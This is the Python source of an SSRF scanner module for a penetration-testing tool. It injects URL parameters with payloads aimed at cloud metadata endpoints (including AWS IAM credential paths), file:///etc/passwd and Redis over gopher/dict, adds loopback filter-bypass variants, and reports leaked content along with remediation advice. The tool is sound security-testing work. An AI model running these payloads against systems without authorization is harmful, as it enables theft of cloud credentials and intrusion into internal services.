"""
SSRF Scanner — Server-Side Request Forgery

FALSE-POSITIVE ELIMINATION STRATEGY
====================================
PROBLEM: Testing every param with metadata URLs and checking for strings like
 "169.254" or "localhost" in the response leads to FPs because:
 - The server may REFLECT the URL parameter back in an error message
 - The term "localhost" appears in config dumps, error pages, etc.

CORRECT APPROACH:
 1. Only report CONFIRMED indicators: actual metadata content (ami-*, 
  IAM role JSON, GCP project data) or actual file content (root:x:0:0:).
 2. Never report just because the payload appears reflected in the response.
 3. Use pattern matching that requires full data structures, not fragments.
 4. OOB: Send probes to OAST but NEVER auto-report — user must verify callbacks.
 5. Cloud metadata responses have very specific JSON/text structures — match those.
"""
from __future__ import annotations
import asyncio
import re
import urllib.parse
from typing import Any

from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

# ---------------------------------------------------------------------------
# Confirmed SSRF indicators — these are unambiguous
# ---------------------------------------------------------------------------

# AWS IMDSv1 metadata response patterns
_RE_AWS_AMI = re.compile(r'\bami-[0-9a-f]{8,17}\b', re.IGNORECASE)
_RE_AWS_IAM = re.compile(
 r'"AccessKeyId"\s*:\s*"ASIA[A-Z0-9]{16}"', re.IGNORECASE
)
_RE_AWS_META = re.compile(
 r'(?:ami-id|instance-id|hostname|local-hostname|local-ipv4|'
 r'placement/region|security-credentials)',
 re.IGNORECASE,
)

# GCP metadata
_RE_GCP = re.compile(
 r'"computeMetadata".*?"project"\s*:\s*\{', re.IGNORECASE | re.DOTALL
)
_RE_GCP2 = re.compile(r'google-cloud-project=', re.IGNORECASE)

# Azure IMDS
_RE_AZURE = re.compile(
 r'"compute"\s*:\s*\{.*?"vmId"\s*:\s*"[0-9a-f-]+"',
 re.IGNORECASE | re.DOTALL,
)

# /etc/passwd 
_RE_PASSWD = re.compile(r'root:x:0:0:[^:]*:/root:/bin/(?:bash|sh)', re.IGNORECASE)

# Redis response (OOB via gopher://)
_RE_REDIS = re.compile(r'\$\d+\r\n\S', re.MULTILINE)

# Internal service responses
_RE_SPRING_ACTUATOR = re.compile(r'"activeProfiles"\s*:\s*\[', re.IGNORECASE)

SSRF_INDICATORS: list[tuple[re.Pattern, str, str]] = [
 (_RE_AWS_AMI, "AWS AMI ID in response — EC2 metadata accessible", "critical"),
 (_RE_AWS_IAM, "AWS IAM credentials in response — CRITICAL", "critical"),
 (_RE_AWS_META, "AWS metadata fields in response", "high"),
 (_RE_GCP, "GCP instance metadata in response", "critical"),
 (_RE_GCP2, "GCP metadata flag in response", "high"),
 (_RE_AZURE, "Azure IMDS data in response", "critical"),
 (_RE_PASSWD, "/etc/passwd content confirmed via SSRF", "critical"),
 (_RE_REDIS, "Redis response data — internal Redis via SSRF", "high"),
 (_RE_SPRING_ACTUATOR, "Spring Actuator data — internal service via SSRF", "high"),
]


def _check_ssrf_response(text: str) -> tuple[bool, str, str]:
 """
 Return (confirmed, description, severity) if response contains
 unambiguous SSRF evidence.
 """
 # Never report if the response is shorter than a plausible metadata response
 if len(text) < 10:
  return False, "", ""

 for pattern, description, severity in SSRF_INDICATORS:
  m = pattern.search(text)
  if m:
   snippet = text[max(0, m.start() - 20): m.end() + 80].strip()
   return True, f"{description}\nSnippet: {snippet[:200]}", severity

 return False, "", ""


# ---------------------------------------------------------------------------
# Test targets — ordered by impact
# ---------------------------------------------------------------------------
SSRF_TARGETS: list[tuple[str, str]] = [
 # (url, description)
 ("http://169.254.169.254/latest/meta-data/", "AWS IMDSv1 root"),
 ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM creds"),
 ("http://169.254.169.254/latest/meta-data/ami-id", "AWS AMI ID"),
 ("http://169.254.169.254/latest/user-data", "AWS user-data"),
 ("http://metadata.google.internal/computeMetadata/v1/?recursive=true", "GCP metadata"),
 ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS"),
 ("http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"),
 ("http://169.254.169.254/metadata/v1/", "DigitalOcean metadata"),
 ("file:///etc/passwd", "Local file /etc/passwd"),
 ("file:///etc/hosts", "Local file /etc/hosts"),
 ("dict://127.0.0.1:6379/info", "Redis via dict://"),
 ("gopher://127.0.0.1:6379/_INFO%0d%0a", "Redis via gopher://"),
 ("http://127.0.0.1/", "Localhost HTTP"),
 ("http://[::1]/", "IPv6 loopback"),
 ("http://2130706433/", "Decimal 127.0.0.1"),
 ("http://0177.0000.0000.0001/", "Octal 127.0.0.1"),
]

# Bypass variants for when direct URLs are filtered
BYPASS_VARIANTS: list[str] = [
 "http://127.1/",
 "http://127.0.1/",
 "http://0x7f000001/",
 "http://[0:0:0:0:0:ffff:127.0.0.1]/",
 "http://[::ffff:7f00:1]/",
 "http://localhost/",
 "http://localhost.localdomain/",
 "http://0/",
 "http://0.0.0.0/",
 "http://spoofed.127.0.0.1.nip.io/",
]

COMMON_SSRF_PARAMS = [
 "url", "uri", "path", "dest", "destination", "redirect", "redirect_uri",
 "redirect_url", "next", "host", "site", "html", "reference", "ref",
 "link", "src", "load", "fetch", "image", "img", "proxy", "feed",
 "open", "to", "out", "view", "page", "from", "return", "returnTo",
 "return_to", "callback", "callback_url", "data", "window", "jump",
 "service", "target", "u", "r", "filepath", "endpoint", "file",
 "api", "resource", "source", "domain", "webhook",
]


async def _test_ssrf_param(
 url: str,
 param: str,
 client: TalismanHTTPClient,
 oast_domain: str | None,
) -> dict[str, Any] | None:
 parsed = urllib.parse.urlparse(url)
 base_params = dict(urllib.parse.parse_qsl(parsed.query))

 all_targets = [(t, d) for t, d in SSRF_TARGETS]

 # Add bypass variants
 for bypass in BYPASS_VARIANTS:
  all_targets.append((bypass, f"Bypass variant: {bypass}"))

 # Add OAST targets (these we probe but don't auto-report)
 oast_targets = []
 if oast_domain:
  oast_targets = [
   f"http://{oast_domain}/ssrf-{param}",
   f"https://{oast_domain}/ssrf-{param}",
  ]

 for target_url, description in all_targets:
  test_params = {**base_params, param: target_url}
  try:
   if "?" in url:
    test_url = parsed._replace(
     query=urllib.parse.urlencode(test_params)
    ).geturl()
   else:
    test_url = parsed._replace(
     query=urllib.parse.urlencode(test_params)
    ).geturl()

   r = await client.get(test_url, timeout=10)
   response_text = r.text

   # Strict check: does the response contain unambiguous SSRF evidence?
   confirmed, evidence, severity = _check_ssrf_response(response_text)

   if confirmed:
    return {
     "param": param,
     "payload": target_url,
     "target_description": description,
     "status": r.status_code,
     "evidence": evidence,
     "severity": severity,
     "request": f"GET {test_url} HTTP/1.1",
     "response_snippet": response_text[:500],
    }

   # Also check POST
   r2 = await client.post(url, data={param: target_url}, timeout=10)
   confirmed2, evidence2, severity2 = _check_ssrf_response(r2.text)
   if confirmed2:
    return {
     "param": param,
     "payload": target_url,
     "target_description": description,
     "status": r2.status_code,
     "evidence": evidence2,
     "severity": severity2,
     "request": f"POST {url}\n{param}={urllib.parse.quote(target_url)}",
     "response_snippet": r2.text[:500],
    }

  except Exception as e:
   log.debug("ssrf_test", param=param, target=target_url[:40], error=str(e)[:60])

 # Send OOB probes (fire and forget — user checks OAST console)
 for oast_url in oast_targets:
  test_params = {**base_params, param: oast_url}
  try:
   test_url = parsed._replace(
    query=urllib.parse.urlencode(test_params)
   ).geturl()
   await client.get(test_url, timeout=6)
  except Exception:
   pass

 return None


async def run(
 target: str,
 session: Any = None,
 scope: Any = None,
 rate_limiter: Any = None,
 proxy: str | None = None,
 oast_domain: str | None = None,
 **kwargs: Any,
) -> dict[str, Any]:
 url = target if "://" in target else f"https://{target}"
 console.print(
  f"\n[module][+] SSRF Scanner[/module] -> [target]{url}[/target]"
 )

 if oast_domain:
  console.print(
   f" OOB probes -> {oast_domain} "
   f"(monitor for callbacks — NOT auto-reported)"
  )

 findings: list[dict[str, Any]] = []

 parsed = urllib.parse.urlparse(url)
 existing_params = list(dict(urllib.parse.parse_qsl(parsed.query)).keys())
 params_to_test = list(dict.fromkeys(existing_params + COMMON_SSRF_PARAMS[:15]))

 async with TalismanHTTPClient(proxy=proxy, timeout=15) as client:
  tasks = [
   _test_ssrf_param(url, param, client, oast_domain)
   for param in params_to_test
  ]
  results = await asyncio.gather(*tasks, return_exceptions=True)

  seen_params: set[str] = set()
  for result in results:
   if not isinstance(result, dict):
    continue
   if result["param"] in seen_params:
    continue
   seen_params.add(result["param"])

   severity = result.get("severity", "high")
   title = (
    f"SSRF — parameter '{result['param']}' — "
    f"{result['target_description']}"
   )
   print_finding(title, severity, url)
   findings.append(result)

   if session:
    await session.add_finding(
     target=url,
     module="ssrf",
     vuln_type="ssrf",
     severity=severity,
     confidence="confirmed",
     title=title,
     description=(
      f"Server-Side Request Forgery confirmed. "
      f"Parameter '{result['param']}' caused the server to "
      f"request '{result['payload']}' and return its contents."
     ),
     request=result["request"],
     evidence=result["evidence"],
     response=result.get("response_snippet", ""),
     reproduction=(
      f"Set parameter '{result['param']}' to: {result['payload']}"
     ),
     remediation=(
      "1. Validate and allowlist URLs — never allow arbitrary "
      "user-supplied URLs.\n"
      "2. Block requests to RFC 1918 / link-local addresses "
      "and metadata endpoints.\n"
      "3. Disable unused protocol handlers "
      "(file://, gopher://, dict://).\n"
      "4. Use IMDSv2 on AWS (requires session token)."
     ),
     cvss_score=9.8,
     cwe="CWE-918",
     references=[
      "https://owasp.org/Top10/A10_2021-Server-Side_Request_"
      "Forgery_%28SSRF%29/"
     ],
    )

 console.print(
  f" Found {len(findings)} confirmed SSRF vulnerabilities"
 )
 return {"target": url, "findings": findings, "count": len(findings)}
